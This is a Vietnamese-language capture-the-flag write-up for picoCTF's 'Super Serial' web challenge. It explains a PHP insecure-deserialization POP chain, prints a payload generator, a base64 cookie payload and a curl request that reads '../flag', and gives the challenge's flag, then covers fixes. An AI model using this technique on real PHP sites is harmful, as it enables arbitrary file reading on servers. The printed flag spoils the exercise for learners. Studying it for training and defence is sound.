# [picoCTF] Super Serial — Writeup

**Category:** Web Exploitation
**Bug class:** PHP Insecure Deserialization / Object Injection (POP Chain)

---

## 1. Khảo sát ban đầu

Trang web là một form đăng nhập đơn giản (`index.php`). Thử nhập username/password bất kỳ, server trả lỗi:

```
Uncaught Exception: SQLite3::__construct(): Unable to open database file
```

Thử vài hướng directory traversal (`../users.db`, encode `%2e%2e`, v.v.) đều bị Apache chặn (400) hoặc trả 404. Kết luận ở bước này:

- File `users.db` thật sự không nằm trong webroot (`/var/www/html`), nó nằm ở thư mục cha (`../users.db`).
- `SQLite3::__construct()` sẽ tự tạo file DB nếu chưa có, nhưng tiến trình `www-data` không có quyền ghi vào thư mục cha → exception văng ra **trước khi** bất kỳ input nào của form được xử lý.

➡️ Đây là một **rabbit hole**: vì script crash ngay ở dòng khởi tạo `SQLite3`, mọi payload SQL Injection nhét vào ô user/pass đều vô nghĩa — code không bao giờ chạy tới đó.

## 2. Tìm đường vòng: `robots.txt` và file `.phps`

Kiểm tra `robots.txt`:

```
User-agent: *
Disallow: /admin.phps
```

Đây là gợi ý (có chủ đích) cho biết server có bật tính năng đọc file `.phps` — đuôi file dùng để **hiển thị mã nguồn PHP dạng text** thay vì thực thi nó (thường dùng để debug, nhưng nếu để công khai thì lộ toàn bộ source).

`admin.phps` trả 404, nhưng vì biết trang có `index.php`, thử `index.phps` → thành công, lấy được toàn bộ source. Từ đó suy ra và lấy tiếp:

- `/index.phps`
- `/cookie.phps`
- `/authentication.phps`

## 3. Phân tích source

**`index.php`:**

```php
require_once("cookie.php");
if(isset($_POST["user"]) && isset($_POST["pass"])){
    $con = new SQLite3("../users.db");
    $username = $_POST["user"];
    $password = $_POST["pass"];
    $perm_res = new permissions($username, $password);
    if ($perm_res->is_guest() || $perm_res->is_admin()) {
        setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
        header("Location: authentication.php");
        die();
    } else {
        $msg = '<h6 style="color:red">Invalid Login.</h6>';
    }
}
```

Điểm mấu chốt: khi login hợp lệ, object `permissions` được **serialize** và lưu vào cookie `login` (base64 + urlencode).

**`cookie.php`:**

```php
class permissions {
    public $username;
    public $password;
    function __construct($u, $p) { $this->username = $u; $this->password = $p; }
    function __toString() { return $u.$p; }
    function is_guest() { ... query SQLite3 ... }
    function is_admin() { ... query SQLite3 ... }
}

if(isset($_COOKIE["login"])){
    try{
        $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
        $g = $perm->is_guest();
        $a = $perm->is_admin();
    }
    catch(Error $e){
        die("Deserialization error. ".$perm);
    }
}
```

Ở lần truy cập sau, server đọc ngược cookie bằng `unserialize()` — **và cookie này hoàn toàn do người dùng kiểm soát.**

**`authentication.php`:**

```php
class access_log {
    public $log_file;
    function __construct($lf) { $this->log_file = $lf; }
    function __toString() { return $this->read_log(); }
    function append_to_log($data) { file_put_contents($this->log_file, $data, FILE_APPEND); }
    function read_log() { return file_get_contents($this->log_file); }
}
```

## 4. Xác định lỗ hổng: Insecure Deserialization → POP Chain

Vì `unserialize()` nhận thẳng dữ liệu từ cookie mà không kiểm tra class, ta có thể giả mạo **bất kỳ object nào đã được khai báo trên server** thay vì `permissions`.

Chuỗi khai thác (gadget chain) được ráp lại như sau:

| Vai trò | Thành phần |
|---|---|
| **Source** (đầu vào do attacker kiểm soát) | Cookie `login` → `unserialize($_COOKIE["login"])` |
| **Gadget** | Class `access_log`: có `$log_file` + magic method `__toString()` gọi `read_log()` → `file_get_contents($log_file)` |
| **Trigger** (thứ kích hoạt gadget) | Dòng `die("Deserialization error. ".$perm);` trong khối `catch` |
| **Sink** (đích nguy hiểm) | `file_get_contents()` — đọc file tùy ý trên server |

**Cơ chế kích hoạt:**

1. Gửi cookie chứa object `access_log` (thay vì `permissions`) → `unserialize()` khôi phục thành công.
2. Server chạy tiếp `$perm->is_guest()` — nhưng `access_log` không có hàm này → PHP ném `Error`.
3. `catch(Error $e)` bắt lỗi, chạy `die("Deserialization error. ".$perm)`.
4. Toán tử nối chuỗi `.` buộc PHP ép `$perm` (object) thành string → tự động gọi **magic method** `__toString()`.
5. `__toString()` gọi `read_log()` → `file_get_contents($this->log_file)` → đọc file mục tiêu.
6. Kết quả được nối vào chuỗi lỗi và in ra qua `die()`.

> **Magic Method** trong PHP là các hàm bắt đầu bằng `__` (như `__construct`, `__toString`, `__destruct`, `__wakeup`...), được PHP **tự động gọi ngầm** trong các tình huống định sẵn — không cần gọi tay. Đây chính là nền tảng của kỹ thuật **POP Chain (Property Oriented Programming)**: lợi dụng các magic method có sẵn để nối các đoạn code rời rạc (gadget) thành một chuỗi thực thi ngoài ý muốn của lập trình viên.

**Vì sao lỗi database ban đầu không cản trở việc khai thác này?**
Vì cả `cookie.php` được `require_once` từ đầu `index.php`, và khối xử lý cookie chỉ chạy khi `isset($_COOKIE["login"])`. Khi ta chủ động gửi cookie độc hại, `die()` bên trong `cookie.php` sẽ chấm dứt chương trình **trước khi** dòng `new SQLite3("../users.db")` (vốn bị lỗi) kịp chạy tới. Nói cách khác: không có cookie → code rơi xuống dưới và crash ở DB; có cookie độc → code chết sớm ở nhánh deserialize, mang theo flag.

## 5. Tạo payload

```php
<?php
class access_log {
    public $log_file;
    function __construct($lf) { $this->log_file = $lf; }
    function __toString() { return $this->read_log(); }
    function read_log() { return file_get_contents($this->log_file); }
}

$perm_res = new access_log("../flag");
echo urlencode(base64_encode(serialize($perm_res)));
```

Kết quả:

```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

## 6. Khai thác

```bash
curl http://mercury.picoctf.net:3449/authentication.php \
  -H "Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9;"
```

Kết quả trả về:

```
Deserialization error. picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}
```

🚩 **Flag:** `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_b4e3f8b1}`

---

## 7. Quy trình tư duy tổng quát (để áp dụng cho bài khác)

1. **Tìm Sink** (hàm nguy hiểm): quét source tìm các hàm nhạy cảm như `file_get_contents`, `system`, `unserialize`, `include`...
2. **Tìm Trigger**: xem có magic method nào (`__toString`, `__wakeup`, `__destruct`...) gọi trực tiếp/gián tiếp tới Sink không, và điều gì khiến PHP tự động gọi magic method đó.
3. **Tìm Source**: xác định input nào của người dùng (cookie, GET/POST, header...) đi thẳng vào `unserialize()` mà không qua kiểm tra.
4. **Nối chuỗi (POP Chain)**: ráp Source → Trigger → Sink thành một luồng thực thi hợp lệ.
5. **Đóng gói payload** đúng định dạng mà nơi nhận input mong đợi (ở đây là `urlencode(base64_encode(serialize()))`).

Đây chính là kỹ thuật **Tainted Data Flow Analysis** kết hợp cách tiếp cận **Bottom-Up** (dò từ Sink nguy hiểm ngược lên Source) — một phản xạ tiêu chuẩn khi code review / săn lỗ hổng deserialization.

## 8. Cách vá lỗi (root cause & fix)

- **Không bao giờ `unserialize()` dữ liệu do người dùng kiểm soát.** Nếu cần lưu trạng thái ở client, dùng `json_encode`/`json_decode` (không có khái niệm magic method nên an toàn hơn nhiều).
- Nếu bắt buộc phải dùng `unserialize()`, giới hạn class được phép khôi phục bằng `unserialize($data, ["allowed_classes" => ["permissions"]])`.
- Ký (sign/HMAC) giá trị cookie để đảm bảo nó không bị chỉnh sửa bởi client trước khi tin tưởng nó.
- Không in giá trị object trực tiếp ra thông báo lỗi (`die("... ".$perm)`) — tránh vô tình kích hoạt `__toString()` trên dữ liệu không tin cậy.
- Sửa quyền/thư mục để `www-data` không thể tự tạo file DB ở vị trí ngoài ý muốn (dù đây chỉ là lỗi hạ tầng của đề, không phải root cause chính).
